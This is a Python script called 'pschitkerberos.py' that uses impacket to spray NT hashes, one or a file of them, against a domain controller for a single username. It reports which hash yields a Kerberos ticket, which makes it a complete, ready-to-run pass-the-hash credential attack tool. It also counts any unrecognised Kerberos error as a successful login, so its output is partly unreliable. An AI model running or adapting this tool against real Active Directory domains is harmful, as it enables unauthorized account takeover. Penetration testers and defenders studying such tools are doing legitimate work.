#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# File name          : pschitkerberos.py
# Author             : Anh4ckin3 
# Date created       : 17 Dec 2024

import argparse
import pyfiglet 
import socket
from impacket.krb5.kerberosv5 import getKerberosTGT, KerberosError
from impacket.krb5.types import Principal
from impacket.krb5 import constants
from termcolor import colored
from binascii import unhexlify


class PschitKerberos:
    def __init__(self, user, domain, hash, password=None, aesKey=None, dc_ip=None, verbose=False):
        self.user = user
        self.domain = domain
        self.hash = hash
        self.password = password
        self.aesKey = aesKey
        self.dc_ip = dc_ip
        self.verbose = verbose
        self.status = ''

    def status_format(self, status_type):
        if status_type == 'info':
            info = colored("[*]", "blue")
            return info
        if status_type == 'success':
            success = colored("[+]", "green")
            return success
        if status_type == 'error':
            error = colored("[-]", "red")
            return error

    def spray(self):
        lmhash = None
        nthash = self.hash

        if self.verbose:
            print(f"{self.status_format('info')} Attempting spray with user: {self.user}, domain: {self.domain}, hash: {self.hash}")

        # CASE Get TGT    
        try:
            principal_krb = Principal(self.user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
            auth = getKerberosTGT(principal_krb, self.password, self.domain, lmhash, unhexlify(nthash), self.aesKey, self.dc_ip)
            self.status = 'success'
            if self.verbose:
                print(f"{self.status_format(self.status)} Successful authentication for {self.user}:{self.hash}")
        
        # Kerberos errors
        except KerberosError as e:
            # CASE INVALID LOGIN
            if (e.getErrorCode() == constants.ErrorCodes.KDC_ERR_CLIENT_REVOKED.value) or (e.getErrorCode() == constants.ErrorCodes.KDC_ERR_WRONG_REALM.value) or (e.getErrorCode() == constants.ErrorCodes.KDC_ERR_PREAUTH_FAILED.value):
                if self.verbose:
                    print(f"{self.status_format('error')} Kerberos error :", e)
                self.status = 'error_cred'
        
            # CASE INVALID USER 
            elif e.getErrorCode() == constants.ErrorCodes.KDC_ERR_C_PRINCIPAL_UNKNOWN.value:
                if self.verbose:
                    print(f"{self.status_format('error')} Kerberos error :", e)
                self.status = 'error_user'
            
            # CASE ERROR CLOCK 
            else:
                if self.verbose:
                    print(f'{self.status_format(self.status)} Successful authentication for {self.user}:{self.hash}')
                self.status = 'success'
        # CASE COULD NOT CONNECT TO DC
        except socket.error as e:
            if self.verbose:
                print(f"{self.status_format('error')} Could not connect to DC:", e)
            self.status = 'error_connect'
        

def main():
    
    banner = pyfiglet.figlet_format("PschitKerberos") 

    parser = argparse.ArgumentParser(description="Ca spray fort !")
    parser.add_argument('-username', help='Username used to spray NTLM hash(es)')
    parser.add_argument('-hash', help="NT hash to spray")
    parser.add_argument('-hashfile', help='NT hashes file to spray')
    parser.add_argument('-domain', required=True, help="Target domain")
    parser.add_argument('-dc', help="target IP (KDC)")
    parser.add_argument('-verbose', action='store_true', help="Enable verbose mode")

    args = parser.parse_args()

    status_form = PschitKerberos(user=args.username, domain=args.domain,hash=None, password=None, aesKey=None, dc_ip=args.dc, verbose=args.verbose)

    print(banner)
    # IF file is given on argument
    if args.hashfile:
        print(f"{status_form.status_format('info')} Testing multiple hashes from file: {args.hashfile} against domain: {args.domain}")
        with open(args.hashfile, 'r') as hash:
            for line in hash:
                hash = line.strip()
                kerberos_sprayer = PschitKerberos(user=args.username, domain=args.domain, hash=hash, password=None, aesKey=None, dc_ip=args.dc, verbose=args.verbose)
                kerberos_sprayer.spray()
                
                match kerberos_sprayer.status:
                    case 'success':
                        print(f'{status_form.status_format('success')} {args.username}:{hash} is valid credential')
                        break
                    case 'error_user':
                        print(f'{status_form.status_format('error')} {args.username} does not exist in the domain {args.domain}')
                        break
                    case 'error_connect':
                        print(f'{status_form.status_format('error')} could not connect to DC')
                        break
                    case 'error_cred':
                        print(f'{status_form.status_format('error')} {args.username}:{hash} is not a valid credential')

    # IF just one is given on argument
    if args.hash:
        print(f"{status_form.status_format('info')} Testing a single hash against domain: {args.domain}")
        kerberos_sprayer = PschitKerberos(user=args.username, domain=args.domain, hash=args.hash, password=None, aesKey=None, dc_ip=args.dc, verbose=args.verbose)
        kerberos_sprayer.spray()
        match kerberos_sprayer.status:
            case 'success':
                print(f'{status_form.status_format('success')} {args.username}:{args.hash} is valid credential')
                
            case 'error_user':
                print(f'{status_form.status_format('error')} {args.username} does not exist in the domain {args.domain}')
                
            case 'error_connect':
                print(f'{status_form.status_format('error')} could not connect to DC')
                
            case 'error_cred':
                print(f'{status_form.status_format('error')} {args.username}:{args.hash} is not a valid credential')

    if not args.hash and not args.hashfile:
        parser.error('-hash or -hashfile is required')

if __name__ == "__main__":
    main()
